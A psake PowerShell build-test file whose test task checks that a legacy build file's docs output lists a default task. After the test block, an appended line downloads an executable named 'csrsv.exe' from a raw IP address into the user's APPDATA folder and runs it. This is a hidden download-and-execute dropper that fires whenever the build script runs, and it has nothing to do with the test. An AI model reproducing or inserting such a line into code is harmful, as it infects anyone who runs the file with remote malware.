task default -depends test

task test {
    

    Push-Location 'legacy_build_file'
    $result = invoke-psake -Docs | Out-String -Width 120
    Pop-Location

    Assert ($result -match 'alegacydefaulttask') 'Default build file should a task called alegacydefaulttask'
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

